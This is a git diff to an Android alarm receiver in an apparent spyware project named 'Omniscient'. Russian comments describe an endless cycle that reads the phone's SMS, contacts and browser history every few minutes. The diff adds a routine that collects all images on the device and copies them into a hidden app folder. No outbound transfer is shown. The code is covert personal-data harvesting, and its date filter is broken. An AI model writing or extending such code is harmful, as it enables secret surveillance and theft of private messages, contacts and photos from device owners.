@@ -12,9 +12,20 @@ import android.os.Build;
 import android.os.Environment;
 import android.util.Log;
 
+import com.postal.omniscient.postal.adapter.AdapterData;
 import com.postal.omniscient.postal.browser.history.BrowserHistory;
 import com.postal.omniscient.postal.reader.contact.ReadContacts;
+import com.postal.omniscient.postal.reader.image.AllImages;
 import com.postal.omniscient.postal.reader.sms.ReadSms;
+
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileNotFoundException;
+import java.io.FileOutputStream;
+import java.io.InputStream;
+import java.io.OutputStream;
+import java.util.Calendar;
+import java.util.List;
 
 /** перезапускаем старт ресивера после выполнения (безконечный цыкл) раз в 5 мин записуем
  *  контакты ,смс и браузера историю*/
@@ -38,6 +49,7 @@ public class AlarmReceiver extends BroadcastReceiver {
         sms.smsToJson();
         contact.getContacts();
         browser.historyToJson();
+        saveIMAGE(context);
 
         AlarmManager alarmManager = (AlarmManager) context.getSystemService(context.ALARM_SERVICE);
         Intent myIntent = new Intent(context, AlarmReceiver.class);
@@ -53,6 +65,67 @@ public class AlarmReceiver extends BroadcastReceiver {
             alarmManager.setExactAndAllowWhileIdle(AlarmManager.RTC_WAKEUP, System.currentTimeMillis()+1000*60*24, pendingIntent);
         }
 
+
+    }
+
+    private void saveIMAGE(Context context) {
+        //IMEGE
+        AllImages img = new AllImages(context.getContentResolver());
+        String DATE_COLUMN_NAME = "date_added > ? AND ?";
+        Calendar currentDate = Calendar.getInstance();
+
+        long end_date = currentDate.getTimeInMillis();// текущаяя дата (/1000 потому что получаем полную дату 14 цыфр а в БД 10 цыфр
+        long start_date = end_date;// дата из БД последней удачной передачи данных
+
+        img.getAllImages(DATE_COLUMN_NAME, start_date, end_date); //для выборки по дате новых фото
+        List<AdapterData> listOfAllImages = img.getAllImages();
+        String patchFile;
+        for (AdapterData a : listOfAllImages) {
+            if(!a.getAddress().equals("")){
+                patchFile = a.getAddress();
+                Log.i("MyMsg", "KARTINKA     "+new File(patchFile).getName());
+                // добавляем свой каталог к пути
+                File pathToFile = new File(context.getFilesDir(), "Omniscient/" +"Image");//DIR);
+                copyFile(patchFile, pathToFile.toString());
+
+            }
+        }
+    }
+    private void copyFile(String inputPath, String outputPath) {
+
+        InputStream in = null;
+        OutputStream out = null;
+        try {
+
+            //create output directory if it doesn't exist
+            File dir = new File (outputPath);
+            if (!dir.exists()) {
+                dir.mkdirs();
+            }
+
+            String inputFile = new File (inputPath).getName();
+            in = new FileInputStream(inputPath);
+            out = new FileOutputStream(outputPath + inputFile);
+
+            byte[] buffer = new byte[1024];
+            int read;
+            while ((read = in.read(buffer)) != -1) {
+                out.write(buffer, 0, read);
+            }
+            in.close();
+            in = null;
+
+            // write the output file (You have now copied the file)
+            out.flush();
+            out.close();
+            out = null;
+
+        }  catch (FileNotFoundException fnfe1) {
+            Log.e("MyMsg", fnfe1.getMessage());
+        }
+        catch (Exception e) {
+            Log.e("MyMsg", e.getMessage());
+        }
 
     }
 }
